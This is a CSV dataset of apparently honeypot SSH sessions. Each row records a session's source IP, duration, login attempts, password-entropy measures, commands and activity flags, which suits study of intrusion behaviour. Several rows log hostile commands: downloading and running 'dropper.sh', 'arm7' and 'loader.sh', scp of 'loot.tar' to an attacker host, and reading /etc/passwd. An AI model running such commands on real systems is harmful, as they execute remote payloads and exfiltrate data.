session,src_ip,session_start,session_end,duration,reported_session_duration,reported_tty_duration,cmd_count,unique_cmds,cmd_failed_count,unique_failed_cmds,cmds_per_min,cmd_failed_per_min,cmd_failed_ratio,login_success,login_fail,fails_per_min,unique_users,unique_pass,pw_entropy_per_char,pw_entropy_total,pw_normalized_entropy,pw_length_mean,pw_unique_chars_mean,pw_total_strength,has_successful_login,has_any_commands,has_failed_commands,commands_used,cmd_failed_count,failed_cmds_used,is_local_src,contains_recon_cmds,contains_install_cmds,contains_nav_cmds,contains_exit_cmd,file_download_count,file_upload_count
19ddfa08ac44,91.92.109.12,2026-03-04 13:05:01+00:00,2026-03-04 13:05:04.500000+00:00,3.5,3.5,0.0,0,0,0,0,0.0,0.0,0.0,0,3,51.42857054693879,3,3,2.2421888895299165,15.094737505048093,0.9624510068154951,6.333333333333333,5.333333333333333,23.59473750504809,0,0,0,[],0,[],0,0,0,0,0,0,0
2f8ab194d0e8,198.18.0.77,2026-03-04 14:28:00+00:00,2026-03-04 14:28:03+00:00,3.0,3.0,0.0,0,0,0,0,0.0,0.0,0.0,0,2,39.99999920000001,2,2,2.160964047443681,9.804820237218404,1.0,4.5,4.5,16.554820237218404,0,0,0,[],0,[],0,0,0,0,0,0,0
5e7f9d0aa131,66.240.219.146,2026-03-04 14:40:30+00:00,2026-03-04 14:40:37.900000+00:00,7.9,7.8,7.4,4,4,1,1,30.379746604710782,7.5949366511776955,0.2499999999375,1,0,0.0,1,1,2.584962500721156,15.509775004326936,1.0,6.0,6.0,24.509775004326936,1,1,1,"['ls -la', 'cat /proc/cpuinfo', 'touch scan.txt', 'scp loot.tar attacker@198.51.100.77:/tmp/loot.tar']",1,['scp loot.tar attacker@198.51.100.77:/tmp/loot.tar'],0,1,1,1,0,0,1
77ca82f0e1ab,45.83.64.12,2026-03-04 12:40:10+00:00,2026-03-04 12:40:18.500000+00:00,8.5,8.5,8.3,4,4,1,1,28.235293918339103,7.058823479584776,0.2499999999375,1,0,0.0,1,1,2.75,22.0,0.979569764547061,8.0,7.0,33.0,1,1,1,"['pwd', 'curl http://example.com/dropper.sh', 'chmod +x dropper.sh', './dropper.sh']",1,['./dropper.sh'],0,1,1,0,0,0,0
7c99d0af04c1,172.104.18.91,2026-03-04 14:12:10+00:00,2026-03-04 14:12:21.200000+00:00,11.2,11.2,10.9,6,6,1,1,32.14285697066327,5.3571428284438785,0.16666666663888888,1,0,0.0,1,1,2.5,20.0,0.967132018086354,8.0,6.0,30.0,1,1,1,"['pwd', 'uname -a', 'id', 'wget http://203.0.113.200/tools/arm7', 'chmod +x arm7', './arm7']",1,['./arm7'],0,1,1,1,0,1,1
884fca7720be,89.248.172.16,2026-03-04 14:55:50+00:00,2026-03-04 14:55:58.100000+00:00,8.1,8.0,7.1,4,4,1,1,29.629629410150898,7.407407352537724,0.2499999999375,1,2,14.814814705075449,3,3,2.218963531869506,12.788175992200093,0.993189921515687,5.333333333333333,5.0,20.45484265886676,1,1,1,"['whoami', 'curl http://198.51.100.88/loader.sh', 'sh loader.sh', 'exit']",1,['sh loader.sh'],0,1,1,0,1,1,0
bf1d67850980,127.0.0.1,2026-03-04 11:37:40.100000+00:00,2026-03-04 11:38:12.160101+00:00,32.060101,32.6,29.2,10,10,2,2,18.714850551378767,3.742970110275753,0.19999999998,1,2,3.742970110275753,3,3,2.2739760316291204,13.869880158145603,0.9821315434523954,5.666666666666667,5.333333333333333,22.036546824812273,1,1,1,"['mkdir dontfind', 'ls', 'cd dontfind', 'pip install python', 'uname -a', 'whoami', 'wget http://malicious.example/payload.sh', '--help ', 'cat /etc/passwd', 'exit']",2,"['pip install python', '--help ']",1,1,1,1,1,0,0
c1a2bb7fd932,203.0.113.77,2026-03-04 13:21:10+00:00,2026-03-04 13:21:18.100000+00:00,8.1,8.0,7.8,3,3,0,0,22.222222057613173,0.0,0.0,1,0,0.0,1,1,2.5216406363433186,17.65148445440323,0.9755037590061086,7.0,6.0,27.15148445440323,1,1,0,"['id', 'uname -r', 'wget http://198.51.100.10/bins/mips']",0,[],0,1,1,0,0,1,0
de9a441bb210,185.220.101.45,2026-03-04 12:10:01+00:00,2026-03-04 12:10:06.200000+00:00,5.2,5.2,0.0,0,0,0,0,0.0,0.0,0.0,0,3,34.615384215976334,3,3,1.9591479170272448,10.754887502163468,0.9475450851791584,5.333333333333333,4.333333333333333,17.754887502163466,0,0,0,[],0,[],0,0,0,0,0,0,0
e55f0a4bb761,198.51.100.24,2026-03-04 13:44:00+00:00,2026-03-04 13:44:01.600000+00:00,1.6,1.6,0.0,0,0,0,0,0.0,0.0,0.0,0,1,37.49999859375005,1,1,2.5216406363433186,17.65148445440323,0.9755037590061086,7.0,6.0,27.15148445440323,0,0,0,[],0,[],0,0,0,0,0,0,0
fa12b4470c10,103.245.12.44,2026-03-04 14:00:01+00:00,2026-03-04 14:00:05.100000+00:00,4.1,4.1,0.0,0,0,0,0,0.0,0.0,0.0,0,4,58.53658450922072,4,4,2.5135764790711415,19.422646117927744,0.9895178380198679,7.5,6.25,29.422646117927744,0,0,0,[],0,[],0,0,0,0,0,0,0
